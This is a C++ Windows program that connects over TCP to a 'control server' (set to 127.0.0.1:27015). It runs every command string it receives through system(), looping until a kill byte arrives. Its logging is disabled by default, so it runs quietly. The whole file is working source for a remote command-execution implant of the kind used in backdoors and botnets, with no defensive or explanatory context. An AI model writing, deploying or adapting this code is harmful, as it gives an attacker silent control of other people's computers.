#include <winsock2.h> 
#include <ws2tcpip.h> 
#include <iostream>
#include <conio.h>
#include <vector>

#pragma comment(lib, "Ws2_32.lib")

#define BUF_LEN 512
#define DEF_PORT 27015

#define SERVER_IP "127.0.0.1"

#define LOG 0


static enum cmdByte {
	keep_alive = '\x01',
	kill_conn = '\x02'
};

char parse_commands(char* buf, size_t len) {
	size_t start = 0;
	char cmd = kill_conn; // <- default to kill connection

	for (size_t i = 0; i < len; i++) {
		if (buf[i] < '\x0a') {
			cmd = buf[i];
			buf[i] = '\x00';

			#if LOG
			std::cout << "--BEGIN MESSAGE--\n\t" << &buf[start] << "\n--END MESSAGE--\n";
			#endif

			system(&buf[start]);
			ZeroMemory(&buf[start], i - start);

			if (cmd == kill_conn) {
				return kill_conn;
			}

			start = i + 1;
		}
	}

	return cmd;
}

char execute_command_from_server(const SOCKET& connection, const sockaddr_in& server) {
	char cmd = keep_alive; // <- default to keep alive
	char recvbuf[BUF_LEN + 1] = { 0 };

	int bytes = recv(connection, recvbuf, BUF_LEN, 0);

	if (bytes > 0) {
		cmd = parse_commands(recvbuf, bytes);
	}

	#if LOG
	std::cout << "--BEGIN MESSAGE--\n\t" << recvbuf << "\n--END MESSAGE--\n";
	#endif

	return cmd;
}

int main() {
	std::cout << "Client Server:\n";

	WSADATA wsaData;
	int err = WSAStartup(MAKEWORD(2, 2), &wsaData);

	// control server info
	sockaddr_in server;
	server.sin_family = AF_INET;
	server.sin_port = htons(DEF_PORT);
	inet_pton(AF_INET, SERVER_IP, &server.sin_addr);


	// set up up connection socket
	SOCKET connection = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

	// connect to server
	err = connect(connection, (struct sockaddr*)&server, sizeof(server));

	#if LOG
	std::cout << "Connected to control\n\n";
	#endif

	while (execute_command_from_server(connection, server) != kill_conn) {
		#if LOG
		std::cout << "Keeping connection alive\n";
		#endif
	}

	#if LOG
	std::cout << "Closing connection\n";
	#endif
	closesocket(connection);

	WSACleanup();
}